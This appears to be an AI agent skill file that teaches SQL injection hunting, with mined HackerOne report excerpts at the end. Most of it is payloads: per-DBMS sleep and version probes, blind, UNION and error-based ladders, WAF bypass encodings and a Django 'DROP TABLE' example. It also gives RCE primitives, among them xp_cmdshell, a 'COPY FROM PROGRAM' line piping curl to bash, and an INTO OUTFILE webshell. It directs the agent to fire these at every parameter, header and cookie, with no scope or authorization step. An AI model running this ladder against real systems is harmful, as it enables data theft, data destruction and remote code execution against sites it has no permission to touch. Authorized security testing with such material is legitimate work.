---
name: hunt-sqli
description: Deep SQL injection hunting — technique selection driven by live responses (UNION vs blind boolean vs time vs OOB), DBMS fingerprinting, modern ORM bypass families (Django CVE-2024-42005, Sequelize, Mongoose populate $where), second-order header injection, WAF bypass tables, RCE-chain primitives (xp_cmdshell, COPY FROM PROGRAM, INTO OUTFILE), marker-discipline validation. Use when any parameter hits a DB-backed endpoint (search, filter, sort, invite, login, export). Trigger keywords: SQLi, SQL injection, blind SQLi, time-based, UNION, boolean.
---

# SQL Injection — Deep Hunting

## THE GATE
Technique selection must be driven by **live responses**, not page hints. If the endpoint reflects query rows → UNION dump; only fall to blind boolean when no reflection. Column count is everything — establish via incremental NULL enumeration, never guessing; wrong count looks identical to "not vulnerable."

## DBMS Fingerprint First
| Test | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Version | `VERSION()` | `version()` | `@@VERSION` | `banner FROM v$version` | `sqlite_version()` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_LOCK.SLEEP(5)` | `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))` |
| Comments | `-- `, `#` | `-- ` | `-- ` | `-- ` | `-- ` |
| Concat | `CONCAT()` | `\|\|` | `+` | `\|\|` | `\|\|` |
| Stacked | `;` (needs API) | `;` | `;` | `;` | `;` |

## Modern ORM Bypass Families (high value 2024-26)
- **Django CVE-2024-42005**: `Item.objects.values('data__"); DROP TABLE x;--')` — JSON-path keys become unquoted SQL aliases in `.values()`.
- **Sequelize**: raw-fragment injection via operators.
- **Mongoose CVE-2024-53900**: `populate({match:{$where:...}})` strips nothing → Mongo `$where` JS exec.
- Second-order injection in headers: `User-Agent`, `X-Forwarded-For`, `Referer` stored unsanitized, later queried.
- Auth-adjacent blind: `POST /invite {"code":"abc' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"}` — boolean diff between "invalid code" vs "accepted+redirect" on OIDC proxy Postgres.

## RCE-Chain Primitives
- MSSQL: `xp_cmdshell` (`EXEC xp_cmdshell 'whoami'`)
- PostgreSQL: `COPY ... FROM PROGRAM 'curl x|bash'`
- MySQL: `INTO OUTFILE` webshell (needs FILE priv)
- All require the "what interprets my bytes" half of the chain to complete.

## WAF Bypass Table
`/**/`, `%09`/`%0A` whitespace, `/*!50000SELECT*/` version comments, `' || '1'='1` for OR-blocks, `BENCHMARK(10000000,MD5(1))` when SLEEP blocked, Unicode `$\u0067t` JSON key obfuscation, chunked TE. Payload alternates across all whitespace encodings before declaring blocked.

## Detection
`X-Powered-By: PHP/Express`; `/search`, `/filter`, `/sort?by=&order=` (**ORDER BY can't be parameterized**), leaky DB error strings; JS grep `db.query(...+` / `WHERE.*\+`. Auth-required endpoints on Airflow/CI tools often hold superuser DB creds.

## Marker-Discipline Validation
- Data must appear in response (UNION) or 5s timing delta confirmed by **statistical trials** (n≥3 distinct sleep payloads; report median, not single sample).
- Error-message-only change = informational.
- Repro in 10 min with single curl.

## Common Mistakes
Stopping at 3-4 columns; claiming on an echoed path; trusting page's "use blind" hints; 200ms deltas reported as time-based; forgetting authenticated-only endpoints on Airflow/CI tools.

## Cross-Validation (prove with 2+ techniques)
| Primary | Cross-check |
|---|---|
| Time-based SLEEP() | 3 distinct sleep payloads, statistical medians |
| Boolean blind body-size | Different boolean comparisons |
| Error-based | UPDATEXML + EXTRACTVALUE both |

## PARAMETER COVERAGE — SQLi/BSQLi on EVERY parameter (MANDATORY)
The #1 miss across past engagements: testing only search/filter/sort params and
skipping IDs, counts, booleans, page/limit, timestamps, nested JSON keys,
headers, and cookies. Injection bugs hide in ALL of them.

1. **Enumerate the FULL input set** on each endpoint BEFORE any payload:
   - every query key (incl. `page`, `limit`, `offset`, `sort`, `order`, `format`, `_`, `callback`)
   - every path segment
   - every JSON/form key, **recursively through nested objects and arrays**
   - headers (`User-Agent`, `Referer`, `X-Forwarded-For`, `X-Requested-With`, `Accept`, `Origin`)
   - every cookie
   - GraphQL args, WS message fields
2. **Run the full ladder on EACH parameter** (one mutation per request, all others at baseline):
   - a. quote/error probe: `'`, `"`, `\`, `'OR'1'='1`
   - b. boolean blind: `<p>' AND '1'='1` vs `<p>' AND '1'='2` (status/body-size diff)
   - c. **time-based blind (BSQLi)**: `' OR SLEEP(5)--`, `' OR pg_sleep(5)--`, `' OR IF(1=1,SLEEP(5),0)--`, `' WAITFOR DELAY '0:0:5'--`, `%0A`/`/**/` whitespace variants — **n≥3 trials per sink, report median**
   - d. UNION: incremental NULL column-count, then extract
   - e. error-based: `UPDATEXML`, `EXTRACTVALUE`, `1/0` divide-by-zero
3. **Every parameter gets tested** — numeric IDs, booleans, and count/limit fields included. A parameter is only "clean" after the FULL ladder, not after one probe.
4. **Re-sweep per context**: anonymous vs logged-in vs different role; form vs JSON vs XML content-type; web vs API vs mobile. Auth-adjacent params (invite codes, reset tokens, sort tokens) are prime blind-SQLi targets.
5. **WAF block on a param ≠ dropped**: run the bypass ladder (comments, `%09`/`%0A`, versioned comments, case-mix, chunked TE, encoded separators) before moving on.
6. **Track in the journal**: `endpoint → param → technique → result`. Any param not logged = gap = re-test.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: sqli — 176 disclosed H1 reports (116 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `alert`
- `_pageLabel`
- `pwd`
- `Submit`
- `scn`
- `check20`
- `content`
- `rcnum`
- `acctid`
- `_nfpb`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] SQL Injection or Denial of Service due to a Prototype Pollution** (SQL Injection)
  - Signal: I would like to report a prototype pollution vulnerability in the `typeorm` package. It allows an attacker that is able to save a specially crafted object to pollute the `Object` p
- **[critical] Pre-Auth Blind NoSQL Injection leading to Remote Code Execution** (None)
  - Signal: **Summary:** The `getPasswordPolicy` method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over accounts by leak
- **[critical] [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database** (SQL Injection)
  - Signal: Hi Guys, There is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database. ## Modu
- **[critical] SQL injection in MilestoneFinder order method** (SQL Injection)
  - Signal: The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and ca

